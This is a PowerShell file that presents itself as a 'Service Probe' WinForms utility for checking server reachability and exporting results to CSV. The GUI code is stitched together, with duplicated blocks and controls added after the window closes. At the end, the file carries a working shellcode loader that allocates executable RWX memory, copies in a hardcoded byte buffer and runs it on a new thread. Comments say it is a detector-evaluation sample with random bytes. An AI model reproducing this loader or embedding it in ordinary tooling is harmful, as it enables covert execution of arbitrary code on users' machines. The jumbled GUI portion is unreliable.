
$ProgressPreference = 'SilentlyContinue'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Service Probe'
$form.Size = New-Object System.Drawing.Size(900, 460)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('filesrv01', 'app-prod-01', 'srv02')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Service Probe'
$form.Size = New-Object System.Drawing.Size(900, 460)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('filesrv01', 'app-prod-01', 'srv02')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$button = New-Object System.Windows.Forms.Button
$button.Text = "Probe"
$button.Location = New-Object System.Drawing.Point(620, 18)
$button.Size = New-Object System.Drawing.Size(100, 28)
$button.Add_Click({
    $button.Enabled = $false
    $statusLabel.Text = 'Checking ...'
    try {
        $reachable = Test-Connection -ComputerName $textBox.Text -Count 2 -Quiet
        if ($reachable) {
            $statusLabel.Text = 'Online'
            [void]$listBox.Items.Add(("{0} - online" -f $textBox.Text))
        }
        else {
            $statusLabel.Text = 'Offline'
            [void]$listBox.Items.Add(("{0} - offline" -f $textBox.Text))
        }
    }
    catch {
        $statusLabel.Text = 'Error'
        Write-Warning $_.Exception.Message
    }
    finally {
        $button.Enabled = $true
    }
})
$form.Controls.Add($button)

$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(18, 64)
$listBox.Size = New-Object System.Drawing.Size(700, 300)
$form.Controls.Add($listBox)
$grid = New-Object System.Windows.Forms.DataGridView
$grid.Location = New-Object System.Drawing.Point(18, 96)
$grid.Size = New-Object System.Drawing.Size(700, 300)
$grid.ReadOnly = $true
$grid.AllowUserToAddRows = $false
$grid.AutoSizeColumnsMode = 'Fill'
$form.Controls.Add($grid)

$table = New-Object System.Data.DataTable
[void]$table.Columns.Add('Server')
[void]$table.Columns.Add('Status')
[void]$table.Columns.Add('CheckedAt')
foreach ($server in $script:servers) {
    [void]$table.Rows.Add($server, 'Unknown', (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))
}
$grid.DataSource = $table

$saveButton = New-Object System.Windows.Forms.Button
$saveButton.Text = 'Export CSV'
$saveButton.Location = New-Object System.Drawing.Point(18, 410)
$saveButton.Size = New-Object System.Drawing.Size(120, 28)
$saveButton.Add_Click({
    $dialog = New-Object System.Windows.Forms.SaveFileDialog
    $dialog.Filter = 'CSV files (*.csv)|*.csv'
    $dialog.FileName = 'health-export.csv'
    if ($dialog.ShowDialog() -eq 'OK') {
        $table | Export-Csv -Path $dialog.FileName -NoTypeInformation -Encoding UTF8
        $statusLabel.Text = 'Exported'
    }
})
$form.Controls.Add($saveButton)
$menu = New-Object System.Windows.Forms.MenuStrip
$fileMenu = New-Object System.Windows.Forms.ToolStripMenuItem
$fileMenu.Text = 'File'
$exitItem = New-Object System.Windows.Forms.ToolStripMenuItem
$exitItem.Text = 'Exit'
$exitItem.Add_Click({ $form.Close() })
[void]$fileMenu.DropDownItems.Add($exitItem)
[void]$menu.Items.Add($fileMenu)
$form.Controls.Add($menu)

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 30000
$timer.Add_Tick({
    $statusLabel.Text = 'Last refresh: ' + (Get-Date).ToString('HH:mm:ss')
})
$timer.Start()
$form.Add_Shown({ $textBox.Focus() })
[void]$form.ShowDialog()
$form.Dispose()

Write-Host ("Console closed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ForegroundColor DarkGray

$aboutItem = New-Object System.Windows.Forms.ToolStripMenuItem
$aboutItem.Text = 'About'
$aboutItem.Add_Click({
    [System.Windows.Forms.MessageBox]::Show('Contoso operations helper', 'About')
})

$toolTip = New-Object System.Windows.Forms.ToolTip
$toolTip.SetToolTip($textBox, 'Enter a short host name such as srv01.')
$toolTip.SetToolTip($button, 'Runs the connectivity check.')

$form.KeyPreview = $true
$form.Add_KeyDown({
    if ($_.KeyCode -eq 'Escape') { $form.Close() }
})

$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Location = New-Object System.Drawing.Point(18, 410)
$progress.Size = New-Object System.Drawing.Size(660, 18)
$form.Controls.Add($progress)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\run.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xfc, 0x98, 0x50, 0x8a, 0x9e, 0x6d, 0xe3, 0xed, 0xe9, 0xeb, 0xe6, 0x2a, 0x85, 0xd3, 0x07, 0x75,
    0x8b, 0x6e, 0xe0, 0x33, 0xe2, 0x99, 0xe7, 0x7d, 0x5d, 0xc4, 0x5f, 0x27, 0x6e, 0x2a, 0x8e, 0xb5,
    0x3f, 0xf7, 0xb5, 0xc9, 0x86, 0x93, 0x58, 0x85, 0x23, 0x6e, 0xbc, 0x90, 0xec, 0x8b, 0x26, 0x15,
    0x12, 0xaf, 0x1b, 0x06, 0x76, 0xb5, 0x9a, 0xf5, 0x72, 0x46, 0xb5, 0x11, 0xfb, 0x09, 0xb2, 0xaa,
    0xbe, 0x39, 0xf7, 0xd4, 0x43, 0x5a, 0x14, 0xd9, 0xe3, 0x0b, 0x6b, 0xa1, 0xee, 0xc4, 0xd1, 0x4f,
    0xb6, 0x9f, 0xce, 0xe8, 0x4c, 0xbd, 0xd0, 0xda, 0x71, 0xfd, 0x0e, 0x04, 0x6c, 0x14, 0xfb, 0xf7,
    0x91, 0x21, 0x05, 0xf4, 0x18, 0x3d, 0x44, 0x95, 0xf2, 0x69, 0xa9, 0x62, 0xea, 0x33, 0x46, 0x96,
    0x45, 0x8f, 0x5c, 0x47, 0x64, 0x3a, 0xbb, 0xf3, 0x14, 0x6b, 0x8c, 0xa7, 0x21, 0x7f, 0xd9, 0x6f,
    0xa0, 0xa1, 0x1a, 0x78, 0xbe, 0x09, 0xf6, 0xb3, 0x3e, 0x75, 0x2c, 0x16, 0x60, 0xc4, 0x6a, 0x37,
    0x72, 0xf5, 0x31, 0x69, 0x0b, 0x4f, 0x24, 0x85, 0x4f, 0x82, 0x27, 0x19, 0x5a, 0xe1, 0x6c, 0x37,
    0xd8, 0xb3, 0xbc, 0xc1, 0xd8, 0x89, 0xe7, 0xfe, 0x58, 0x98, 0xf7, 0x55, 0x54, 0x66, 0xcb, 0xb2,
    0x20, 0x1d, 0x63, 0x31, 0x09, 0x52, 0xa3, 0xea, 0x9a, 0xa6, 0xf4, 0xad, 0x76, 0x99, 0x42, 0xa5,
    0x67, 0xc4, 0x65, 0x20, 0xf7, 0x5c, 0x1f, 0x02, 0x8b, 0x8d, 0x8f, 0x79, 0xe0, 0xa3, 0xb0, 0xc0,
    0x2d, 0x46, 0x23, 0x90, 0xf1, 0xfb, 0x00, 0xdf, 0x11, 0x81, 0x68, 0x9d, 0x10, 0x47, 0x0d, 0x7f,
    0x99, 0xfa, 0x70, 0x18, 0xf7, 0x76, 0x6c, 0x53, 0x30, 0xfd, 0x8b, 0xf7, 0x87, 0x15, 0x66, 0x8b,
    0xeb, 0xda, 0xd2, 0xd6, 0x5e, 0x48, 0xaf, 0x19, 0x38, 0xfe, 0x70, 0x1a, 0xaf, 0x2d, 0xa4, 0x91,
    0x1d, 0x1a, 0xd8, 0x07, 0x1a, 0xb3, 0xe7, 0xf1, 0xaf, 0x22, 0x84, 0x22, 0x5a, 0x01, 0x64, 0xb6,
    0xeb, 0xe8, 0xf5, 0x71, 0xa4, 0xf0, 0x9e, 0x0f, 0x46, 0x3f, 0x43, 0x88, 0xe8, 0xc3, 0x86, 0xaa,
    0xf0, 0x11, 0xae, 0x89, 0x1a, 0xa0, 0x8a, 0xed, 0xbe, 0xa5, 0xa9, 0x55, 0xe9, 0xbe, 0xb3, 0xa0,
    0xb3, 0x3f, 0x37, 0xf8, 0x49, 0xe7, 0xf0, 0xa3, 0xbd, 0xe9, 0x60, 0xb5, 0xe2, 0xc2, 0x13, 0x6c,
    0xda, 0xff, 0xc3, 0xdf, 0x51, 0xb5, 0xe0, 0x95, 0x16, 0x7a, 0xa0
)

$Handle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 3521)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
